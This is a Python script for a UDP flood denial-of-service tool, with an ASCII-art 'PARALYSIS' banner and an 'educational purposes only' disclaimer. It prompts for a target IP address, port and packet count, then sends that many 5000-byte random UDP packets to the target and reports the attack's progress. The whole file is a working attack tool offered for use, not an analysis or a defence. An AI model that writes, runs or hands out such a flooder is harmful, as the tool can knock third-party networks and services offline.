#imports
import os
import sys
import time
import socket
import random
import threading
from pip._vendor.distlib.compat import raw_input
import pyfiglet

os.system("cls") #use this for windows. change to os.system("clear") for linux


#colour dictionary
COLORS = {\
"black":"\u001b[30;1m",
"red": "\u001b[31;1m",
"green":"\u001b[32m",
"yellow":"\u001b[33;1m",
"blue":"\u001b[34;1m",
"magenta":"\u001b[35m",
"cyan": "\u001b[36m",
"white":"\u001b[37m",
"yellow-background":"\u001b[43m",
"black-background":"\u001b[40m",
"cyan-background":"\u001b[46;1m",
}
#You can add more colors and backgrounds to the dictionary


def colortext(text):
    for color in COLORS:
        text = text.replace("[[" + color + "]]", COLORS[color])
    return text

#changes colours
def resetcolour():
    resetx = """[[white]]"""
    print(colortext(resetx))
    
def blue():
    bluetxt = """[[blue]]"""
    print(colortext(bluetxt))
    
def red():
    redtxt = """[[red]]"""
    print(colortext(redtxt))

def green():
    grntxt = """[[green]]"""
    print(colortext(grntxt))
def pink():
    pinktxt = """[[magenta]]"""
    print(colortext(pinktxt))
def ylw():
    ylwtxt = """[[yellow]]"""
    print(colortext(ylwtxt))

os.system("cls")
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet=random._urandom(5000)
sent = 0

class dosattack():
    def __init__(self,ipaddress,port,packets):
        self.ipaddress=ipaddress
        self.port=port
        self.packets=packets

    def __str__(self):
        return " \u001b[31m__Information__ \n\n \u001b[31;1mIp Address: \u001b[34m{}\n \u001b[31;1mPort: \u001b[34m{}\n \u001b[31;1mPacket: \u001b[34m{}".format(self.ipaddress,self.port,self.packets)

    def __len__(self):
        return self.packets

while True:
        try:
            blue()
            print("""


     ██▓███   ▄▄▄       ██▀███   ▄▄▄       ██▓   ▓██   ██▓  ██████  ██▓  ██████ 
    ▓██░  ██▒▒████▄    ▓██ ▒ ██▒▒████▄    ▓██▒    ▒██  ██▒▒██    ▒ ▓██▒▒██    ▒ 
    ▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  ▒██░     ▒██ ██░░ ▓██▄   ▒██▒░ ▓██▄   
    ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ ▒██░     ░ ▐██▓░  ▒   ██▒░██░  ▒   ██▒
    ▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒░██████▒ ░ ██▒▓░▒██████▒▒░██░▒██████▒▒
    ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░▓  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░░▓  ▒ ▒▓▒ ▒ ░
    ░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░▓██ ░▒░ ░ ░▒  ░ ░ ▒ ░░ ░▒  ░ ░
    ░░         ░   ▒     ░░   ░   ░   ▒     ░ ░   ▒ ▒ ░░  ░  ░  ░   ▒ ░░  ░  ░  
                   ░  ░   ░           ░  ░    ░  ░░ ░           ░   ░        ░  
                                                  ░ ░
                                              """)
		
            time.sleep(1)
            red()
            print("""
                                   DISCLAIMER:
                   I am not responsible and hold no responsibility
                           for what you do with this tool,
                       it is for educational purposes only!
            """)
            ipp=input(" \u001b[34mSystem Ip Address:\u001b[31m ")
            pport=int(input(" \u001b[34mWhich Port:\u001b[31m "))
            packetss=int(input(" \u001b[34mHow Many Packages:\u001b[31m "))
            os.system("cls")
            break
        except ValueError:
                print("\n \u001b[31mPlease enter a number!")
                time.sleep(2)
                os.system("cls")
blue()
print("""

     ██▓███   ▄▄▄       ██▀███   ▄▄▄       ██▓   ▓██   ██▓  ██████  ██▓  ██████ 
    ▓██░  ██▒▒████▄    ▓██ ▒ ██▒▒████▄    ▓██▒    ▒██  ██▒▒██    ▒ ▓██▒▒██    ▒ 
    ▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  ▒██░     ▒██ ██░░ ▓██▄   ▒██▒░ ▓██▄   
    ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ ▒██░     ░ ▐██▓░  ▒   ██▒░██░  ▒   ██▒
    ▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒░██████▒ ░ ██▒▓░▒██████▒▒░██░▒██████▒▒
    ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░▓  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░░▓  ▒ ▒▓▒ ▒ ░
    ░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░▓██ ░▒░ ░ ░▒  ░ ░ ▒ ░░ ░▒  ░ ░
    ░░         ░   ▒     ░░   ░   ░   ▒     ░ ░   ▒ ▒ ░░  ░  ░  ░   ▒ ░░  ░  ░  
                   ░  ░   ░           ░  ░    ░  ░░ ░           ░   ░        ░  
                                                  ░ ░                           

                    """)

atak1=dosattack(ipp,pport,packetss)
print(atak1)
os.system("cls")

for i in range(packetss):
    blue()
    print("""


     ██▓███   ▄▄▄       ██▀███   ▄▄▄       ██▓   ▓██   ██▓  ██████  ██▓  ██████ 
    ▓██░  ██▒▒████▄    ▓██ ▒ ██▒▒████▄    ▓██▒    ▒██  ██▒▒██    ▒ ▓██▒▒██    ▒ 
    ▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  ▒██░     ▒██ ██░░ ▓██▄   ▒██▒░ ▓██▄   
    ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ ▒██░     ░ ▐██▓░  ▒   ██▒░██░  ▒   ██▒
    ▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒░██████▒ ░ ██▒▓░▒██████▒▒░██░▒██████▒▒
    ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░▓  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░░▓  ▒ ▒▓▒ ▒ ░
    ░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░▓██ ░▒░ ░ ░▒  ░ ░ ▒ ░░ ░▒  ░ ░
    ░░         ░   ▒     ░░   ░   ░   ▒     ░ ░   ▒ ▒ ░░  ░  ░  ░   ▒ ░░  ░  ░  
                   ░  ░   ░           ░  ░    ░  ░░ ░           ░   ░        ░  
                                                  ░ ░                           

                        """)
    print(atak1)
    s.sendto(packet,(ipp,pport))
    sent = sent + 1
    print("\n \u001b[31mAttacking>>> \u001b[34m{}".format(sent))
    os.system("cls")
blue()
print("""


     ██▓███   ▄▄▄       ██▀███   ▄▄▄       ██▓   ▓██   ██▓  ██████  ██▓  ██████ 
    ▓██░  ██▒▒████▄    ▓██ ▒ ██▒▒████▄    ▓██▒    ▒██  ██▒▒██    ▒ ▓██▒▒██    ▒ 
    ▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  ▒██░     ▒██ ██░░ ▓██▄   ▒██▒░ ▓██▄   
    ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ ▒██░     ░ ▐██▓░  ▒   ██▒░██░  ▒   ██▒
    ▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒░██████▒ ░ ██▒▓░▒██████▒▒░██░▒██████▒▒
    ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░▓  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░░▓  ▒ ▒▓▒ ▒ ░
    ░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░▓██ ░▒░ ░ ░▒  ░ ░ ▒ ░░ ░▒  ░ ░
    ░░         ░   ▒     ░░   ░   ░   ▒     ░ ░   ▒ ▒ ░░  ░  ░  ░   ▒ ░░  ░  ░  
                   ░  ░   ░           ░  ░    ░  ░░ ░           ░   ░        ░  
                                                  ░ ░                           

                                                                 
                    """)
print(atak1)
print("\n \u001b[32mAttack Completed...")
input()
